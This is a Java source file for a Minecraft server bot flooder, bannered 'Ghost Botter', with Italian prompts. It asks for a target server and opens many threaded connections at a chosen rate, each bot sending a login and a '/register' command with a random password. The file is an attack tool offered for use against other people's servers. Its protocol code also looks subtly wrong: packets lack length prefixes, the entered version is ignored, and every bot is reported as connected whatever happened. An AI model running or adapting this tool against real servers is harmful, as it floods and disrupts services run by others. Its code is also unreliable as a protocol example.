import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.util.Random;
import java.util.Scanner;

public class Main {
    private static final String CHARACTERS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    private static final int DEFAULT_PORT = 25565; // Porta standard di Minecraft

    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);

        System.out.println("\u001B[31m");
        System.out.println("  ▄████  ██░ ██  ▒█████    ██████ ▄▄▄█████▓    ▄▄▄▄    ▒█████  ▄▄▄█████▓▄▄▄█████▓▓█████  ██▀███  ");
        System.out.println(" ██▒ ▀█▒▓██░ ██▒▒██▒  ██▒▒██    ▒ ▓  ██▒ ▓▒   ▓█████▄ ▒██▒  ██▒▓  ██▒ ▓▒▓  ██▒ ▓▒▓█   ▀ ▓██ ▒ ██▒");
        System.out.println("▒██░▄▄▄░▒██▀▀██░▒██░  ██▒░ ▓██▄   ▒ ▓██░ ▒░   ▒██▒ ▄██▒██░  ██▒▒ ▓██░ ▒░▒ ▓██░ ▒░▒███   ▓██ ░▄█ ▒");
        System.out.println("░▓█  ██▓░▓█ ░██ ▒██   ██░  ▒   ██▒░ ▓██▓ ░    ▒██░█▀  ▒██   ██░░ ▓██▓ ░ ░ ▓██▓ ░ ▒▓█  ▄ ▒██▀▀█▄  ");
        System.out.println("░▒▓███▀▒░▓█▒░██▓░ ████▓▒░▒██████▒▒  ▒██▒ ░    ░▓█  ▀█▓░ ████▓▒░  ▒██▒ ░   ▒██▒ ░ ░▒████▒░██▓ ▒██▒");
        System.out.println(" ░▒   ▒  ▒ ░░▒░▒░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░  ▒ ░░      ░▒▓███▀▒░ ▒░▒░▒░   ▒ ░░     ▒ ░░   ░░ ▒░ ░░ ▒▓ ░▒▓░");
        System.out.println("  ░   ░  ▒ ░▒░ ░  ░ ▒ ▒░ ░ ░▒  ░ ░    ░       ▒░▒   ░   ░ ▒ ▒░     ░        ░     ░ ░  ░  ░▒ ░ ▒░");
        System.out.println("░ ░   ░  ░  ░░ ░░ ░ ░ ▒  ░  ░  ░    ░          ░    ░ ░ ░ ░ ▒    ░        ░         ░     ░░   ░ ");
        System.out.println("      ░  ░  ░  ░    ░ ░        ░               ░          ░ ░                       ░  ░   ░     ");
        System.out.println("                                                    ░                                            ");
        System.out.println("\u001B[0m");

        System.out.println("Numero di bot: ");
        int numBots = scanner.nextInt();

        System.out.println("Numero di bot al secondo: ");
        int botsPerSecond = scanner.nextInt();

        scanner.nextLine();

        System.out.println("Indirizzo del server Minecraft: ");
        String serverAddress = scanner.nextLine();

        System.out.println("Porta del server Minecraft (lascia vuoto per la porta standard 25565): ");
        String portInput = scanner.nextLine();
        int serverPort = portInput.isEmpty() ? DEFAULT_PORT : Integer.parseInt(portInput);

        System.out.println("Versione del server Minecraft: ");
        String minecraftVersion = scanner.nextLine();

        System.out.println("Numero di ripetizioni della password per la registrazione: ");
        int passwordRepeats = scanner.nextInt();

        connectBots(numBots, botsPerSecond, serverAddress, serverPort, minecraftVersion, passwordRepeats);
    }

    private static void connectBots(int numBots, int botsPerSecond, String serverAddress, int serverPort, String minecraftVersion, int passwordRepeats) {
        int connectedBots = 0;
        int currentBotNumber = 1;

        while (connectedBots < numBots) {
            String botName = "GhostBot-" + currentBotNumber++;
            String password = generateRandomPassword(8);

            new Thread(() -> connectBot(serverAddress, serverPort, botName, password, passwordRepeats)).start();

            try {
                Thread.sleep(1000 / botsPerSecond);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }

            connectedBots++;
        }

        System.out.println("Tutti i " + numBots + " bot sono stati connessi.");
    }

    private static void connectBot(String serverAddress, int serverPort, String botName, String password, int passwordRepeats) {
        try (Socket socket = new Socket(serverAddress, serverPort)) {
            OutputStream out = socket.getOutputStream();

            byte[] handshakePacket = createHandshakePacket(serverAddress, serverPort);
            out.write(handshakePacket);

            byte[] loginPacket = createLoginPacket(botName);
            out.write(loginPacket);

            byte[] registerPacket = createRegisterPacket(password, passwordRepeats);
            out.write(registerPacket);

            System.out.println("Bot " + botName + " connesso e registrato con la password: " + password);

        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private static byte[] createHandshakePacket(String serverAddress, int serverPort) {
        ByteArrayOutputStream buffer = new ByteArrayOutputStream();
        try {
            buffer.write(writeVarInt(0));
            buffer.write(writeVarInt(754)); // Minecraft 1.16.5 protocol version
            buffer.write(writeString(serverAddress));
            buffer.write(writeShort((short) serverPort));
            buffer.write(writeVarInt(2));
        } catch (IOException e) {
            e.printStackTrace();
        }
        return buffer.toByteArray();
    }

    private static byte[] createLoginPacket(String botName) {
        ByteArrayOutputStream buffer = new ByteArrayOutputStream();
        try {
            buffer.write(writeVarInt(0));
            buffer.write(writeString(botName));
        } catch (IOException e) {
            e.printStackTrace();
        }
        return buffer.toByteArray();
    }

    private static byte[] createRegisterPacket(String password, int passwordRepeats) {
        ByteArrayOutputStream buffer = new ByteArrayOutputStream();
        try {
            StringBuilder command = new StringBuilder("/register ").append(password);
            for (int i = 1; i < passwordRepeats; i++) {
                command.append(" ").append(password);
            }
            buffer.write(writeVarInt(0x03));
            buffer.write(writeString(command.toString()));
        } catch (IOException e) {
            e.printStackTrace();
        }
        return buffer.toByteArray();
    }

    private static String generateRandomPassword(int length) {
        Random random = new Random();
        StringBuilder password = new StringBuilder();

        for (int i = 0; i < length; i++) {
            password.append(CHARACTERS.charAt(random.nextInt(CHARACTERS.length())));
        }

        return password.toString();
    }

    private static byte[] writeVarInt(int value) {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        while (true) {
            if ((value & 0xFFFFFF80) == 0) {
                out.write(value);
                return out.toByteArray();
            }

            out.write(value & 0x7F | 0x80);
            value >>>= 7;
        }
    }

    private static byte[] writeString(String value) {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        byte[] bytes = value.getBytes(StandardCharsets.UTF_8);
        try {
            out.write(writeVarInt(bytes.length));
            out.write(bytes);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return out.toByteArray();
    }

    private static byte[] writeShort(short value) {
        return new byte[]{(byte) (value >> 8), (byte) value};
    }
}